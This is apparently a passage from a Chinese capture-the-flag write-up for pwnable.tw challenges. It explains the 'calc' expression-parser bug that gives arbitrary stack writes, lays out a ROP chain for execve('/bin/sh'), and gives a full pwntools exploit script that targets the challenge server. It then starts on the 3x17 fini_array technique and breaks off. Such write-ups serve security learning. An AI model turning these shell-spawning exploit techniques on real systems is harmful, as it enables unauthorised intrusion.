      number<span class="token punctuation">[</span><span class="token operator">*</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> number<span class="token punctuation">[</span><span class="token operator">*</span>number<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      number<span class="token punctuation">[</span><span class="token operator">*</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>number<span class="token punctuation">[</span><span class="token operator">*</span>number<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> Operator <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    number<span class="token punctuation">[</span><span class="token operator">*</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*=</span> number<span class="token punctuation">[</span><span class="token operator">*</span>number<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  result <span class="token operator">=</span> number<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token operator">*</span>number<span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>为什么说重要呢，之前苦思冥想了很久，也没找到洞，看了大佬的wp后，发现思路竟然是非标准输入算式来进行任意地址写。</p> <p>调试的时候可以发现，这里计算<code>number[*number - 1] += number[*number];</code>如果一开始是*number = 1,就相当于number[0] = number[1]。</p> <p>最后main最后能打印出number[0]的地址。如此一来，可以进行一个任一地址写的操作。由于number[1]是我们能够控制的，所以能改number[0]，这样依次就能改出一条pop链，由于32位程序，利用<code>execve(/bin/sh\0)</code>进行<code>getshell</code>。</p> <p>利用<a href="https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" target="_blank" rel="noopener noreferrer">系统调用表<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>布置栈的参数。</p> <p><img src="https://i.loli.net/2021/04/26/Y4kp5ETFK8mytgq.jpg" alt="n"></p> <p><img src="https://i.loli.net/2021/04/26/8mpzqcO9UZbH5u7.jpg" alt="s"></p> <p>可知需要设置的参数是<code>eax,ebx,ecx,edx</code>,利用<code>int 80</code>进行函数调用，利用栈地址找到<code>/bin/sh</code>需要的地址。通过'+'符号进行这样布局。利用<code>ROPgadget</code> 进行查找，</p> <p><img src="https://i.loli.net/2021/04/26/s6gcSHnKMmzOIyY.jpg" alt="num"></p> <p>看见number在栈的<code>0x5A0</code>位置，又数组是<code>int</code>型，4字节为内存步长，可以计算出<code>0x5A0 // 4 = 360</code> 占360个偏移位。</p> <p>利用+360，得到栈地址。+361得到calc的返回地址.</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>/mnt/f/pwnable.tw/calc 2m 21s
❯ ./calc
<span class="token operator">==</span><span class="token operator">=</span> Welcome to SECPROG calculator <span class="token operator">==</span><span class="token operator">=</span>
+360
-6217960
+361
<span class="token number">134517913</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>通过计算 hex(134517913) = 0x08049499</p> <div class="language-assembly line-numbers-mode"><pre class="language-text"><code>.text:08049494 014 E8 E0 FE FF FF                    call    calc            ; Call Procedure
.text:08049499 014 C7 04 24 42 F8 0B+                mov     dword ptr [esp], offset aMerryChristmas ; &quot;Merry Christmas!&quot;
.text:08049499 014 08
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这样能拿到栈地址和返回地址,也能任意写，就可以构造一串ROP链了.</p> <table><thead><tr><th style="text-align:center;">Address</th> <th style="text-align:center;">Stack</th> <th style="text-align:center;">Function</th></tr></thead> <tbody><tr><td style="text-align:center;"><code>ebp+0x5A0</code>(number[0])</td> <td style="text-align:center;">number数组</td> <td style="text-align:center;"><code>calc</code>函数栈</td></tr> <tr><td style="text-align:center;">.....</td> <td style="text-align:center;"></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"><code>ebp</code>(number[360])</td> <td style="text-align:center;">最后一位即是<code>ebp</code></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"><code>main-ebp</code>(ret)[361]</td> <td style="text-align:center;"><code>ret_addr</code></td> <td style="text-align:center;"><code>main</code>函数栈</td></tr> <tr><td style="text-align:center;">362</td> <td style="text-align:center;"><code>pop_eax_ret</code></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">363</td> <td style="text-align:center;">0xb</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">364</td> <td style="text-align:center;"><code>pop_ecx&amp;&amp;pop_ebx</code></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">365</td> <td style="text-align:center;">0</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">366</td> <td style="text-align:center;"><code>/bin/sh_addr</code></td> <td style="text-align:center;"></td></tr></tbody></table> <table><thead><tr><th style="text-align:center;">Address</th> <th style="text-align:center;">Stack</th> <th style="text-align:center;">Function</th></tr></thead> <tbody><tr><td style="text-align:center;">367</td> <td style="text-align:center;"><code>int 80</code></td> <td style="text-align:center;"><code>main</code>函数栈</td></tr> <tr><td style="text-align:center;">368</td> <td style="text-align:center;"><code>'/bin'</code></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">369</td> <td style="text-align:center;"><code>/sh\0</code></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">370构造后的(<code>ebp</code>)</td> <td style="text-align:center;"></td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;"></td> <td style="text-align:center;"></td></tr></tbody></table> <h4 id="exp-3"><a href="#exp-3" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token number">32</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x08049494</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">leak_addr_binsh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    re<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#get ebp_addr</span>
    ebp_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x100000000</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0FFFFFFF0</span>
    slog<span class="token punctuation">[</span><span class="token string">'ebp_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> ebp_addr
    esp_addr <span class="token operator">=</span> ebp_addr <span class="token operator">-</span> <span class="token number">0x10</span>
    slog<span class="token punctuation">[</span><span class="token string">'esp_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> esp_addr
    binsh_addr <span class="token operator">=</span> ebp_addr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x100000000</span> <span class="token comment">#通过栈布局得到</span>
    slog<span class="token punctuation">[</span><span class="token string">'binsh_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> binsh_addr
    <span class="token keyword">return</span> binsh_addr

<span class="token keyword">def</span> <span class="token function">put_stack</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> content <span class="token operator">&lt;</span> ret <span class="token punctuation">:</span>
        ret <span class="token operator">-=</span> content
        sl<span class="token punctuation">(</span><span class="token string">'+'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        ret <span class="token operator">=</span> content <span class="token operator">-</span> ret
        sl<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'+'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
    recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rop <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0805c34b</span><span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">,</span><span class="token number">0x080701d1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x08049a21</span><span class="token punctuation">,</span>u32<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>u32<span class="token punctuation">(</span><span class="token string">'/sh\0'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#pop_eax,参数,pop_ecx&amp;pop_ebx,参数,add_binsh,int80,'/bin/sh'</span>
    rop<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> leak_addr_binsh<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        put_stack<span class="token punctuation">(</span><span class="token number">361</span><span class="token operator">+</span>i<span class="token punctuation">,</span>rop<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'give me flag'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span><span class="token number">10100</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br></div></div></details> <h4 id="盲点"><a href="#盲点" class="header-anchor">#</a> 盲点</h4> <ol><li>通过利用不规则运算法进行获取和修改地址</li> <li>最后输入的地址需要为负数，不然<code>ebp</code>会提高的很大</li></ol> <h2 id="_3x17"><a href="#_3x17" class="header-anchor">#</a> 3X17</h2> <h4 id="分析-4"><a href="#分析-4" class="header-anchor">#</a> 分析</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/f/pwnable.tw/3x17/3x17'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>几乎没开什么保护。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token operator">++</span>byte_4B9330<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_4B9330 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> <span class="token string">&quot;addr:&quot;</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> <span class="token string">&quot;data:&quot;</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v6 <span class="token punctuation">)</span>
    <span class="token function">sub_44A3E0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>除了俩输入点，似乎没有利用手段，溢出也是不可能的事情了。学习了<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener noreferrer">裁缝店师傅的wp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，收益良多。这个题目的主要打法其实是靠<code>linux</code>下<code>fini_array</code>启动时候的数组进行一个多次写的操作。利用<code>fini_array</code>进行栈迁移。</p> <p>通过对<code>libc_csu_fini</code> 的利用，由于<code>libc_csu_fini</code> 会调用一个 <code>fini_array</code> 数组，而这个数组只有两个元素，而且当数组执行的时候，<code>fini_array[1]</code>比<code>fini_array[0]</code>先利用。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">__libc_csu_init</span> <span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* For dynamically linked executables the preinit array is executed by
